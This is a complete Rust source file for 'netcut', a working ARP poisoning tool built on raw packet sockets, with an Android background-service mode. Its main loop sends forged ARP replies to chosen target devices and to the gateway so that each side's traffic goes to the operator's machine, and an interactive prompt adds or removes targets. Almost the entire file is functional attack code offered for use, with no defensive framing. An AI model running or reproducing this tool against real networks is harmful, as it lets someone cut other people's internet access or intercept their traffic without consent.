use anyhow::{anyhow, Context, Result};
use clap::Parser;
use libc::{
    c_int, c_void, close, if_nametoindex, ioctl, sendto, setsockopt, socket, sockaddr,
    sockaddr_ll, socklen_t, AF_PACKET, ETH_ALEN, ETH_P_ARP, IFNAMSIZ, SIOCGIFADDR,
    SIOCGIFHWADDR, SOCK_RAW, SOL_SOCKET, SO_BINDTODEVICE,
};
use signal_hook::consts::{SIGINT, SIGTERM};
use signal_hook::iterator::Signals;
use std::collections::HashMap;
use std::io::Write;
use std::mem::{size_of, zeroed};
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

// -------- CLI --------

#[derive(Parser, Debug)]
#[command(name = "netcut", about = "ARP poisoning service (libc raw sockets)")]
struct Args {
    /// Network interface (e.g., wlan0)
    iface: String,

    /// Gateway IP (router) - Required for spoofing and restoring
    gateway: Ipv4Addr,

    /// Initial target IPs (optional, can be added later via commands)
    #[arg(value_name = "TARGET_IP")]
    initial_targets: Vec<Ipv4Addr>,

    /// Packets-per-second rate
    #[arg(long, default_value_t = 10)]
    rate: u64,

    /// Max seconds to wait for MAC resolution
    #[arg(long, default_value_t = 15)]
    resolve_timeout: u64,

    /// Enable Android service mode (monitor parent process)
    #[arg(long, default_value_t = false)]
    android_service: bool,

    /// Parent PID to monitor (for Android service mode)
    #[arg(long)]
    parent_pid: Option<i32>,
}

// -------- ioctl request type shim (glibc vs bionic) --------
#[cfg(target_env = "gnu")]
type IoctlReq = libc::c_ulong;
#[cfg(not(target_env = "gnu"))]
type IoctlReq = libc::c_int;

// -------- ifreq layout --------

#[repr(C)]
union IfrIfru {
    ifru_addr: sockaddr,
    ifru_hwaddr: sockaddr,
    ifru_flags: libc::c_short,
    ifru_ivalue: libc::c_int,
    ifru_mtu: libc::c_int,
    ifru_data: *mut c_void,
    _pad: [u8; 24],
}

#[repr(C)]
struct Ifreq {
    ifr_name: [libc::c_char; IFNAMSIZ],
    ifr_ifru: IfrIfru,
}

impl Ifreq {
    fn new(iface: &str) -> Result<Self> {
        if iface.len() >= IFNAMSIZ {
            return Err(anyhow!("interface name too long"));
        }
        let mut req: Ifreq = unsafe { zeroed() };
        for (i, b) in iface.as_bytes().iter().enumerate() {
            req.ifr_name[i] = *b as libc::c_char;
        }
        Ok(req)
    }
}

// -------- Ethernet / ARP frame --------

#[repr(C, packed)]
#[derive(Clone, Copy)]
struct ArpFrame {
    eth_dst: [u8; 6],
    eth_src: [u8; 6],
    eth_type: u16, // BE: 0x0806
    htype: u16,    // BE: 1
    ptype: u16,    // BE: 0x0800
    hlen: u8,      // 6
    plen: u8,      // 4
    oper: u16,     // BE: 1 request / 2 reply
    sha: [u8; 6],
    spa: [u8; 4],
    tha: [u8; 6],
    tpa: [u8; 4],
}

impl ArpFrame {
    fn as_bytes(&self) -> &[u8] {
        unsafe {
            std::slice::from_raw_parts(
                (self as *const ArpFrame) as *const u8,
                size_of::<ArpFrame>(),
            )
        }
    }
}

fn build_arp_reply(
    src_mac: [u8; 6],
    dst_mac: [u8; 6],
    spoofed_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
) -> ArpFrame {
    ArpFrame {
        eth_dst: dst_mac,
        eth_src: src_mac,
        eth_type: 0x0806u16.to_be(),
        htype: 1u16.to_be(),
        ptype: 0x0800u16.to_be(),
        hlen: 6,
        plen: 4,
        oper: 2u16.to_be(),
        sha: src_mac,
        spa: spoofed_ip.octets(),
        tha: dst_mac,
        tpa: target_ip.octets(),
    }
}

// NEW: Restoration-specific ARP builder that prevents Wi-Fi driver disconnects
fn build_arp_reply_restore(
    tx_mac: [u8; 6],         // MUST be host's MAC for Wi-Fi driver compliance
    dst_mac: [u8; 6],        // Destination MAC (target or gateway)
    real_sender_mac: [u8; 6], // The actual MAC of the sender (goes in ARP payload)
    sender_ip: Ipv4Addr,     // The actual IP of the sender
    target_ip: Ipv4Addr,     // The IP we are updating in the target's cache
) -> ArpFrame {
    ArpFrame {
        eth_dst: dst_mac,
        eth_src: tx_mac, // Host's MAC (prevents Wi-Fi firmware anomaly drops)
        eth_type: 0x0806u16.to_be(),
        htype: 1u16.to_be(),
        ptype: 0x0800u16.to_be(),
        hlen: 6,
        plen: 4,
        oper: 2u16.to_be(),
        sha: real_sender_mac, // Real MAC (updates remote cache correctly)
        spa: sender_ip.octets(),
        tha: dst_mac,
        tpa: target_ip.octets(),
    }
}

fn build_arp_request(
    src_mac: [u8; 6],
    sender_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
) -> ArpFrame {
    ArpFrame {
        eth_dst: [0xff; 6],
        eth_src: src_mac,
        eth_type: 0x0806u16.to_be(),
        htype: 1u16.to_be(),
        ptype: 0x0800u16.to_be(),
        hlen: 6,
        plen: 4,
        oper: 1u16.to_be(),
        sha: src_mac,
        spa: sender_ip.octets(),
        tha: [0; 6],
        tpa: target_ip.octets(),
    }
}

fn build_gratuitous_arp(mac: [u8; 6], ip: Ipv4Addr) -> ArpFrame {
    ArpFrame {
        eth_dst: [0xff; 6],
        eth_src: mac,
        eth_type: 0x0806u16.to_be(),
        htype: 1u16.to_be(),
        ptype: 0x0800u16.to_be(),
        hlen: 6,
        plen: 4,
        oper: 2u16.to_be(),
        sha: mac,
        spa: ip.octets(),
        tha: [0x00; 6],
        tpa: ip.octets(),
    }
}

// -------- Raw socket --------

struct RawSock {
    fd: c_int,
}

impl RawSock {
    fn new(protocol: u16) -> Result<Self> {
        let proto = i32::from(protocol.to_be());
        let fd = unsafe { socket(AF_PACKET, SOCK_RAW, proto) };
        if fd < 0 {
            return Err(std::io::Error::last_os_error()).context("socket(AF_PACKET, SOCK_RAW)");
        }
        Ok(Self { fd })
    }

    fn bind_to_device(&self, iface: &str) -> Result<()> {
        let bytes = iface.as_bytes();
        let rc = unsafe {
            setsockopt(
                self.fd,
                SOL_SOCKET,
                SO_BINDTODEVICE,
                bytes.as_ptr() as *const c_void,
                bytes.len() as socklen_t,
            )
        };
        if rc < 0 {
            return Err(std::io::Error::last_os_error()).context("SO_BINDTODEVICE");
        }
        Ok(())
    }

    fn send_frame(&self, frame: &[u8], ifindex: i32) -> Result<()> {
        let mut sll: sockaddr_ll = unsafe { zeroed() };
        sll.sll_family = AF_PACKET as u16;
        sll.sll_protocol = (ETH_P_ARP as u16).to_be();
        sll.sll_ifindex = ifindex;
        sll.sll_halen = ETH_ALEN as u8;
        sll.sll_addr[..6].copy_from_slice(&frame[0..6]);

        let sent = unsafe {
            sendto(
                self.fd,
                frame.as_ptr() as *const c_void,
                frame.len(),
                0,
                &sll as *const sockaddr_ll as *const sockaddr,
                size_of::<sockaddr_ll>() as socklen_t,
            )
        };
        if sent < 0 {
            return Err(std::io::Error::last_os_error()).context("sendto");
        }
        Ok(())
    }
}

impl Drop for RawSock {
    fn drop(&mut self) {
        unsafe { close(self.fd) };
    }
}

// -------- Interface info --------

fn get_iface_mac(iface: &str) -> Result<[u8; 6]> {
    let fd = unsafe { socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
    if fd < 0 {
        return Err(std::io::Error::last_os_error()).context("socket(AF_INET) for ioctl");
    }
    let mut req = Ifreq::new(iface)?;
    let rc = unsafe { ioctl(fd, SIOCGIFHWADDR as IoctlReq, &mut req as *mut _) };
    let err = std::io::Error::last_os_error();
    unsafe { close(fd) };
    if rc < 0 {
        return Err(err).context("SIOCGIFHWADDR");
    }
    let sa = unsafe { &req.ifr_ifru.ifru_hwaddr };
    let mut mac = [0u8; 6];
    for i in 0..6 {
        mac[i] = sa.sa_data[i] as u8;
    }
    Ok(mac)
}

fn get_iface_ipv4(iface: &str) -> Result<Ipv4Addr> {
    let fd = unsafe { socket(libc::AF_INET, libc::SOCK_DGRAM, 0) };
    if fd < 0 {
        return Err(std::io::Error::last_os_error()).context("socket(AF_INET) for ioctl");
    }
    let mut req = Ifreq::new(iface)?;
    let rc = unsafe { ioctl(fd, SIOCGIFADDR as IoctlReq, &mut req as *mut _) };
    let err = std::io::Error::last_os_error();
    unsafe { close(fd) };
    if rc < 0 {
        return Err(err).context("SIOCGIFADDR");
    }
    let sa = unsafe { &req.ifr_ifru.ifru_addr };
    let ip = Ipv4Addr::new(
        sa.sa_data[2] as u8,
        sa.sa_data[3] as u8,
        sa.sa_data[4] as u8,
        sa.sa_data[5] as u8,
    );
    Ok(ip)
}

fn get_iface_index(iface: &str) -> Result<i32> {
    let cname = std::ffi::CString::new(iface).context("iface name has NUL")?;
    let idx = unsafe { if_nametoindex(cname.as_ptr()) };
    if idx == 0 {
        return Err(std::io::Error::last_os_error()).context("if_nametoindex");
    }
    Ok(idx as i32)
}

// -------- MAC resolution --------

fn resolve_mac(
    iface: &str,
    our_mac: [u8; 6],
    our_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
    ifindex: i32,
    timeout: Duration,
    stop: &Arc<AtomicBool>,
) -> Result<[u8; 6]> {
    let resolver = RawSock::new(ETH_P_ARP as u16)?;
    resolver.bind_to_device(iface)?;

    let tv = libc::timeval {
        tv_sec: 0,
        tv_usec: 250_000,
    };
    unsafe {
        setsockopt(
            resolver.fd,
            SOL_SOCKET,
            libc::SO_RCVTIMEO,
            &tv as *const _ as *const c_void,
            size_of::<libc::timeval>() as socklen_t,
        );
    }

    let req = build_arp_request(our_mac, our_ip, target_ip);
    let deadline = Instant::now() + timeout;
    let mut last_send = Instant::now() - Duration::from_secs(60);
    let mut buf = [0u8; 1500];

    while Instant::now() < deadline && !stop.load(Ordering::Relaxed) {
        if last_send.elapsed() >= Duration::from_millis(500) {
            if let Err(e) = resolver.send_frame(req.as_bytes(), ifindex) {
                eprintln!("[!] ARP request send error: {e}");
            }
            last_send = Instant::now();
        }

        let n = unsafe { libc::recv(resolver.fd, buf.as_mut_ptr() as *mut c_void, buf.len(), 0) };
        if n < 0 {
            let e = std::io::Error::last_os_error();
            if let Some(code) = e.raw_os_error() {
                if code == libc::EAGAIN || code == libc::EWOULDBLOCK || code == libc::EINTR {
                    continue;
                }
            }
            return Err(e).context("recv while resolving MAC");
        }
        let n = n as usize;
        if n < size_of::<ArpFrame>() {
            continue;
        }
        let eth_type = u16::from_be_bytes([buf[12], buf[13]]);
        if eth_type != 0x0806 {
            continue;
        }
        let oper = u16::from_be_bytes([buf[20], buf[21]]);
        if oper != 2 {
            continue;
        }
        let spa = Ipv4Addr::new(buf[28], buf[29], buf[30], buf[31]);
        if spa != target_ip {
            continue;
        }
        let mut mac = [0u8; 6];
        mac.copy_from_slice(&buf[22..28]);
        return Ok(mac);
    }

    Err(anyhow!("timed out resolving MAC for {}", target_ip))
}

// -------- Utility --------

fn format_mac(m: &[u8; 6]) -> String {
    format!(
        "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
        m[0], m[1], m[2], m[3], m[4], m[5]
    )
}

// -------- Parent process monitoring --------

fn is_process_alive(pid: i32) -> bool {
    unsafe {
        let ret = libc::kill(pid, 0);
        ret == 0
    }
}

fn monitor_parent(pid: i32, running: &Arc<AtomicBool>, stop: &Arc<AtomicBool>) {
    let running = running.clone();
    let stop = stop.clone();

    thread::spawn(move || {
        while running.load(Ordering::SeqCst) {
            if !is_process_alive(pid) {
                eprintln!("[*] Parent process {} terminated, stopping...", pid);
                running.store(false, Ordering::SeqCst);
                stop.store(true, Ordering::Release);
                break;
            }
            thread::sleep(Duration::from_millis(500));
        }
    });
}

// -------- Target Management --------

struct TargetInfo {
    ip: Ipv4Addr,
    mac: [u8; 6],
}

// -------- ARP Cache Management (Optimized & Safe) --------

#[cfg(any(target_os = "linux", target_os = "android"))]
fn force_arp_entry(iface: &str, ip: Ipv4Addr, mac: [u8; 6]) {
    let ip_str = ip.to_string();
    let mac_str = format_mac(&mac);
    
    // We intentionally DO NOT flush the whole interface. 
    // Flushing the gateway causes Android's ConnectivityService to panic and reconnect Wi-Fi.
    // We only update the specific target entries to keep the host's gateway connection intact.
    let _ = std::process::Command::new("ip")
        .args([
            "neigh", "replace", 
            &ip_str, 
            "lladdr", &mac_str, 
            "dev", iface, 
            "nud", "reachable"
        ])
        .output();
}

#[cfg(not(any(target_os = "linux", target_os = "android")))]
fn force_arp_entry(_iface: &str, _ip: Ipv4Addr, _mac: [u8; 6]) {
    // No-op on other platforms
}

// -------- Aggressive restore function (Wi-Fi Safe) --------

fn aggressive_restore(
    sock: &RawSock,
    ifindex: i32,
    targets: &Vec<(Ipv4Addr, [u8; 6])>,
    gateway_ip: Ipv4Addr,
    gateway_mac: [u8; 6],
    iface: &str,
    our_mac: [u8; 6],
    our_ip: Ipv4Addr,
) {
    eprintln!("[*] Starting instantaneous ARP restoration...");
    
    // ========== PHASE 1: Restore local host ARP entries (Safe) ==========
    eprintln!("[*] Restoring local host ARP entries...");
    for (ip, mac) in targets {
        force_arp_entry(iface, *ip, *mac);
    }
    
    // ========== PHASE 2: Flood with correct ARP replies to TARGETS ==========
    eprintln!("[*] Sending corrective ARP replies to targets...");
    
    for (ip, mac) in targets {
        // 1. Tell target: "The gateway IP is at the gateway's real MAC"
        // We transmit using our MAC (to satisfy Wi-Fi driver), but payload has gateway's real MAC.
        let restore_target = build_arp_reply_restore(
            our_mac,         // tx_mac (must be host's MAC for Wi-Fi)
            *mac,            // dst_mac (target)
            gateway_mac,     // real_sender_mac (gateway)
            gateway_ip,      // sender_ip (gateway)
            *ip,             // target_ip (target)
        );
        
        // 2. Tell gateway: "The target IP is at the target's real MAC"
        let restore_gateway = build_arp_reply_restore(
            our_mac,         // tx_mac (must be host's MAC for Wi-Fi)
            gateway_mac,     // dst_mac (gateway)
            *mac,            // real_sender_mac (target)
            *ip,             // sender_ip (target)
            gateway_ip,      // target_ip (gateway)
        );
        
        // Send packets (reduced from 50 to 10 to prevent Wi-Fi driver rate-limiting/anomaly drops)
        for _ in 0..10 {
            let _ = sock.send_frame(restore_target.as_bytes(), ifindex);
            let _ = sock.send_frame(restore_gateway.as_bytes(), ifindex);
        }
    }
    
    // ========== PHASE 3: Gratuitous ARP for OURSELF ==========
    eprintln!("[*] Sending gratuitous ARP for host...");
    
    // Only announce our OWN correct MAC and IP. 
    // Do NOT announce the gateway's IP, as that causes MAC mismatch warnings on Wi-Fi.
    let gratuitous_ourself = build_gratuitous_arp(our_mac, our_ip);
    
    for _ in 0..5 {
        let _ = sock.send_frame(gratuitous_ourself.as_bytes(), ifindex);
    }
    
    eprintln!("[+] Instantaneous restoration complete. Internet should be restored immediately.");
}

// -------- Main --------

fn main() -> Result<()> {
    unsafe {
        libc::signal(libc::SIGPIPE, libc::SIG_IGN);
    }

    let args = Args::parse();

    let ifindex = get_iface_index(&args.iface)?;
    let src_mac = get_iface_mac(&args.iface)?;
    let src_ip = get_iface_ipv4(&args.iface)?;
    
    eprintln!(
        "[*] Service starting: iface={} ifindex={} mac={} ip={}",
        args.iface,
        ifindex,
        format_mac(&src_mac),
        src_ip
    );

    let running = Arc::new(AtomicBool::new(true));
    let stop = Arc::new(AtomicBool::new(false));

    {
        let running = running.clone();
        let stop = stop.clone();

        let mut signals = Signals::new(&[SIGINT, SIGTERM])
            .context("failed to register signal handlers")?;

        thread::spawn(move || {
            for signal in signals.forever() {
                match signal {
                    SIGINT => {
                        eprintln!("\n[*] Received SIGINT (Ctrl+C), shutting down...");
                        running.store(false, Ordering::SeqCst);
                        stop.store(true, Ordering::Release);
                        break;
                    }
                    SIGTERM => {
                        eprintln!("[*] Received SIGTERM, shutting down...");
                        running.store(false, Ordering::SeqCst);
                        stop.store(true, Ordering::Release);
                        break;
                    }
                    _ => unreachable!(),
                }
            }
        });
    }

    if args.android_service {
        if let Some(parent_pid) = args.parent_pid {
            eprintln!("[*] Android service mode enabled, monitoring parent PID: {}", parent_pid);
            monitor_parent(parent_pid, &running, &stop);
        } else {
            eprintln!("[!] Android service mode requires --parent-pid");
            return Err(anyhow!("missing parent PID"));
        }
    }

    let timeout = Duration::from_secs(args.resolve_timeout);

    eprintln!("[*] Resolving gateway MAC...");
    let gateway_mac = resolve_mac(
        &args.iface,
        src_mac,
        src_ip,
        args.gateway,
        ifindex,
        timeout,
        &stop,
    )
    .with_context(|| format!("resolving MAC of gateway {}", args.gateway))?;
    eprintln!("[+] Gateway MAC: {}", format_mac(&gateway_mac));

    let targets: Arc<Mutex<HashMap<Ipv4Addr, TargetInfo>>> = Arc::new(Mutex::new(HashMap::new()));

    for ip in args.initial_targets {
        eprintln!("[*] Resolving initial target MAC for {}...", ip);
        match resolve_mac(&args.iface, src_mac, src_ip, ip, ifindex, timeout, &stop) {
            Ok(mac) => {
                targets.lock().unwrap().insert(ip, TargetInfo { ip, mac });
                eprintln!("[+] Added {} ({}) to target list.", ip, format_mac(&mac));
            }
            Err(e) => {
                eprintln!("[!] Failed to resolve MAC for {}: {}", ip, e);
            }
        }
    }

    let sock = RawSock::new(ETH_P_ARP as u16)?;
    sock.bind_to_device(&args.iface)?;

    // -------- Interactive Command Thread --------
    let targets_clone = Arc::clone(&targets);
    let running_clone = Arc::clone(&running);
    let stop_clone = Arc::clone(&stop);
    let iface_clone = args.iface.clone();
    let gateway_clone = args.gateway;
    let src_mac_clone = src_mac;
    let src_ip_clone = src_ip;
    let ifindex_clone = ifindex;
    let timeout_clone = timeout;
    let gateway_mac_clone = gateway_mac;

    thread::spawn(move || {
        let stdin = std::io::stdin();
        let mut input = String::new();
        let is_tty = unsafe { libc::isatty(libc::STDIN_FILENO) == 1 };
        
        if is_tty {
            eprintln!("[*] Service ready. Commands: add <ip>, remove <ip>, list, status, quit");
        } else {
            eprintln!("[*] Service ready in background mode. Waiting for commands via stdin...");
        }

        while running_clone.load(Ordering::SeqCst) {
            if is_tty {
                eprint!("netcut> ");
                let _ = std::io::stderr().flush();
            }
            
            input.clear();
            match stdin.read_line(&mut input) {
                Ok(0) => {
                    thread::sleep(Duration::from_millis(500));
                    continue;
                }
                Ok(_) => {
                    if input.trim().is_empty() {
                        continue;
                    }
                }
                Err(_) => {
                    thread::sleep(Duration::from_millis(500));
                    continue;
                }
            }

            let parts: Vec<&str> = input.trim().split_whitespace().collect();
            if parts.is_empty() { continue; }

            match parts[0] {
                "add" => {
                    if parts.len() < 2 {
                        eprintln!("Usage: add <ip>");
                        continue;
                    }
                    if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
                        let already_exists = {
                            let t = targets_clone.lock().unwrap();
                            t.contains_key(&ip)
                        };
                        if already_exists {
                            eprintln!("[!] {} is already in the target list.", ip);
                            continue;
                        }
                        
                        eprintln!("[*] Resolving MAC for {}...", ip);
                        match resolve_mac(&iface_clone, src_mac_clone, src_ip_clone, ip, ifindex_clone, timeout_clone, &stop_clone) {
                            Ok(mac) => {
                                let mut t = targets_clone.lock().unwrap();
                                t.insert(ip, TargetInfo { ip, mac });
                                eprintln!("[+] Added {} ({}) to target list.", ip, format_mac(&mac));
                            }
                            Err(e) => {
                                eprintln!("[!] Failed to resolve MAC for {}: {}", ip, e);
                            }
                        }
                    } else {
                        eprintln!("[!] Invalid IP address.");
                    }
                }
                "remove" => {
                    if parts.len() < 2 {
                        eprintln!("Usage: remove <ip>");
                        continue;
                    }
                    if let Ok(ip) = parts[1].parse::<Ipv4Addr>() {
                        let info = {
                            let mut t = targets_clone.lock().unwrap();
                            t.remove(&ip)
                        };
                        
                        if let Some(info) = info {
                            eprintln!("[*] Removing {} and restoring ARP...", ip);
                            
                            if let Ok(temp_sock) = RawSock::new(ETH_P_ARP as u16) {
                                aggressive_restore(
                                    &temp_sock,
                                    ifindex_clone,
                                    &vec![(ip, info.mac)],
                                    gateway_clone,
                                    gateway_mac_clone,
                                    &iface_clone,
                                    src_mac_clone,
                                    src_ip_clone,
                                );
                            } else {
                                eprintln!("[!] Failed to create temporary socket for restoration.");
                            }
                            
                            eprintln!("[+] Removed {} and restored ARP.", ip);
                        } else {
                            eprintln!("[!] {} is not in the target list.", ip);
                        }
                    } else {
                        eprintln!("[!] Invalid IP address.");
                    }
                }
                "list" => {
                    let t = targets_clone.lock().unwrap();
                    if t.is_empty() {
                        eprintln!("[*] No targets currently added.");
                    } else {
                        eprintln!("[*] Current targets:");
                        for (ip, info) in t.iter() {
                            eprintln!("  - {} ({})", ip, format_mac(&info.mac));
                        }
                    }
                }
                "status" => {
                    let t = targets_clone.lock().unwrap();
                    eprintln!("[*] Service is running. Active targets: {}", t.len());
                }
                "quit" | "exit" => {
                    eprintln!("[*] Shutting down...");
                    running_clone.store(false, Ordering::SeqCst);
                    stop_clone.store(true, Ordering::Release);
                    break;
                }
                _ => {
                    eprintln!("[!] Unknown command. Use: add <ip>, remove <ip>, list, status, quit");
                }
            }
        }
    });

    // -------- Bidirectional Poisoning Loop --------
    let interval = Duration::from_millis(1000 / args.rate.max(1));
    eprintln!("[*] Bidirectional poisoning engine active. Waiting for targets...");

    while running.load(Ordering::SeqCst) {
        if stop.load(Ordering::Acquire) {
            break;
        }

        let targets_snapshot = {
            let t = targets.lock().unwrap();
            t.iter().map(|(ip, info)| (*ip, info.mac)).collect::<Vec<_>>()
        };

        if targets_snapshot.is_empty() {
            thread::sleep(Duration::from_secs(1));
            continue;
        }

        for (ip, mac) in targets_snapshot {
            // 1. Poison Target: Tell target the gateway is at our MAC
            let poison_target = build_arp_reply(src_mac, mac, args.gateway, ip);
            let _ = sock.send_frame(poison_target.as_bytes(), ifindex);
            
            // 2. Poison Gateway: Tell gateway the target is at our MAC
            let poison_gateway = build_arp_reply(src_mac, gateway_mac, ip, args.gateway);
            let _ = sock.send_frame(poison_gateway.as_bytes(), ifindex);
        }
        
        thread::sleep(interval);
    }

    // -------- Aggressive Bidirectional Restore --------
    let targets_snapshot = {
        let t = targets.lock().unwrap();
        t.iter().map(|(ip, info)| (*ip, info.mac)).collect::<Vec<_>>()
    };

    if !targets_snapshot.is_empty() {
        aggressive_restore(
            &sock,
            ifindex,
            &targets_snapshot,
            args.gateway,
            gateway_mac,
            &args.iface,
            src_mac,
            src_ip,
        );
    }

    eprintln!("[+] Restore complete. Exiting.");
    Ok(())
}
